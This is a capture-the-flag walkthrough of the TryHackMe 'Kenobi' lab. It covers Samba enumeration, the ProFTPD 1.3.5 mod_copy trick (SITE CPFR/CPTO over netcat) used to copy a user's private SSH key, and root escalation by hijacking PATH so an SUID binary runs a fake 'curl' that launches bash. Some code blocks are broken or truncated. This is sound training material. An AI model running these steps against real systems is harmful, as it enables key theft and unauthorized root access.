This is a writeup for the Kenobi challenge on Try-Hack-Me. This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary. Rated as Easy/Beginner level machine.
<!--exc-->


# Introduction
In this post, we'll try to root [Kenobi](https://tryhackme.com/room/kenobi). It was created by [tryhackme](https://tryhackme.com/p/tryhackme). It is rated as **Easy/Beginner** level machine.

**Goal**: Enumerate Samba share, manipulate a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.


# Prerequisites
## Kali Linux / Parrot Security OS 
The virtual machine we'll use to source the attack vectors against the Kenobi machine. These Linux distribution has all required tools pre-installed. Choose one of them.
* Kali Linux VM (based on Debian distribution) can be downloaded for both VMware and VirtualBox from [Offensive-Security](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)
* Parrot Security VM (based on Arch distribution with different desktop flavors) can be downloaded from [Parrot Security](https://www.parrotsec.org/download/)

## TryHackMe account
Signup or login to [TryHackMe](https://tryhackme.com/), deploy the [machine](https://tryhackme.com/room/kenobi) and give it a couple of minutes to boot.

## Dedicated Directory
We need to create a dedicated directory in our home directory `~` for our findings. We'll use `mkdir` to create the directory and `cd` to change into it:

```console
$ mkdir ~/tryhackme/kenobi
$ cd ~/tryhackme/kenobi/
```

## Add IP to hosts file [OPTIONAL]
For better readability we'll add the target IP to our local `/etc/hosts` file.
Please note this command requires sudo privileges. 

```console
$ sudo nano /etc/hosts

127.0.0.1       localhost
127.0.1.1       kali
10.10.214.193   kenobi
...
```

Now we can use the '**kenobi**' hostname instead of the IP in all the commands.


# Scanning
## nmap
We'll start with scanning the target for open ports using [nmap](https://nmap.org/). The command we'll use is `sudo nmap -sV -T4 -p- -O -oN nmap kenobi` which is a full TCP-SYN scan to scan all ports on the target. Let's break it down:
* `-sV` determine service/version info
* `-T4` for faster execution
* `-p-` scan all ports
* `-O` identify Operating System
* `-oN` output to file, in our case it's called nmap

```console
$ sudo nmap -sV -T4 -p- -O -oN nmap kenobi

## SMB/SAMBA
We found active [Samba](https://en.wikipedia.org/wiki/Samba_(software)) services on both port 139 and 445. Using the suggested command in TryHackMe page, we can enumerate the shares:

```console
$ sudo nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse kenobi
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-01 13:48 EST
Nmap scan report for kenobi
Host is up (0.082s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\kenobi\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))

|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 13.33 seconds
```

Now we'll use [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) to inspect the `anonymous` sharename using `anonymous` user:
`smbclient //kenobi/anonymous -U anonymous` (leave WORKGROUP empty). 
We're greeted with a command prompt.
Using `ls` command we can list the directory files (use `help` command for additional commands) and find an interesting file. using `get` command we can download it to our machine and read it locally in our machine.

Note:
: In case there are many files in a given share, you can recursively download the file using `smbget -R smb://<ip>/anonymous`.

## RPC / RPCBIND
[rpcbind](https://linux.die.net/man/8/rpcbind) is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells **rpcbind** the address at which it is listening and the RPC program number its prepared to serve.
We'll use the following scripts built into [nmap script engine](https://nmap.org/book/man-nse.html) to enumerate the RPC:
`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount kenobi`

```console
sudo nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount kenobi

# Gaining Access
## ProFTPd
Note:
: Before using **searchsploit**, you might need to update it using `apt update; apt install metasploit-framework` command.

According the initial nmap scan, we found the running proftp service running on port 21. The service version is `1.3.5`. We can use **searchsploit** to find known vulnerabilities for that version:

```console
searchsploit proftpd 1.3.5 
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path

--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Read more about the `mod_copy` module [HERE](http://www.proftpd.org/docs/contrib/mod_copy.html). To summarize, we can use this module to **copy files from one location to another**.
One key file in Linux systems is the private SSH key. In this case it belongs to kenobi user.
We'll use [netcat](https://en.wikipedia.org/wiki/Netcat) (`nc`) to connect to the FTP port and use `SITE CPFR` (copy from) and `SITE CPTO` (copy to) commands to copy the key file:

```console
nc kenobi
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [kenobi]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

We now have a copy of the private key (**id_rsa** file) in a location we can access - `/var`(see section about SMB/SAMBA). Let's mount that directory to our machine in order to access it (please double check if `sudo` is required on your environment):
1.  Create a mount directory on our machine - `sudo mkdir /mnt/kenobi`
2.  Mount the remote directory to our machine - `sudo mount kenobi:/var /mnt/kenobi`
3.  List available files to verify `ls -la /mnt/kenobi/tmp`
4.  For ease of use I prefer to copy that file into my working directory/project directory - `cp /mnt/kenobi/tmp/id_rsa`. You may choose another location.
5.  Unmount the directory - `sudo umount /mnt/kenobi`


## SSH
Now we can use that private key to login as the **Kenobi** user using SSH - `ssh kenobi@kenobi -i id_rsa` where `-i` flag is used to specify the private key location.

We get the following warning:

```console
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
```

Which means we need to change the file permission using [chmod](https://www.man7.org/linux/man-pages/man2/chmod.2.html) `sudo chmod 600 id_rsa`.

No run the ssh command again to gain access the system.

Now we only need to retrieve the flag file from Kenobie's home directory:

```console
$ cat /home/kenobi/user.txt 
[REDACTED]
```


# Privilege Escalation

Note:
: Explanation about SUID, SGID and Sticky Bits can be found on [Red Hat website](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit) and TryHackMe:

![SUID SGID](https://i.imgur.com/LN2uOCJ.png){: .normal}

Let's look for files that have the SUID Bit enabled - `find / -perm -u=s -type f 2>/dev/null`
* `/` is the root path to start the scan from
* `-perm -u=s` SUID bit enabled
* `-type f` search for file (`d` for directory)
* `2>/dev/null` this will produce a cleaner output as it will redirect any errors, such as permission errors to /dev/null instead of the screen. 

We can note an unusual file in `/usr/bin/menu`.

We can check the file permissions using `ls -l`:

```console
$ ls -l /usr/bin/menu 
-rwsr-xr-x 1 root root 8880 Sep  4  2019 /usr/bin/menu
```

As we can see the file is running using belongs to `root`. keep that in mind as it will be useful next.

Executing the binary file will prompt us with the following:

```console
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

Let's have a look into the binary file and try to find anything useful. Sometimes it's not possible due to compilation of the file. 

If we want to look into this binary we can use simple `cat` command. Yet the output is messy. Using [strings](https://linux.die.net/man/1/strings) command is much better as it's output is only readable characters - `strings /usr/bin/menu`.

We see that depending on our choice, the binary is invoking Linux commands behind the scene - `curl`, `uname` and `ifconfig`.
As the binary running these commands without using their full path - `curl`, not `/usr/bin/curl` - we might be able to manipulate the command path and make the binary invoke a malicious command instead (keep in mind it is running as root!)

To overwrite `curl` path and make our script invoke `bash` instead, we'll:
1.  Change dir to `/tmp` as that folder permissions is very permissive
2.  Create a new file called `curl` which contains the malicious command (run bash) - `echo /bin/bash > curl` and change the file permissions so it can be executed - `chmod 777 curl`
3.  Overwrite `curl` [path](https://opensource.com/article/17/6/set-path-linux) - `export PATH=/tmp:$PATH`
4.  Run the binary and choose **1** to make it call our malicious curl

```console
/usr/bin/menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

5.  Now use [whoami](https://en.wikipedia.org/wiki/Whoami) to verify we're root

Now as root we can access the flag:

```console
cat /root/root.txt
[REDACTED]
```


# Summary
* SAMBA can be a series risk to a machine and a good attack vector for an attacker
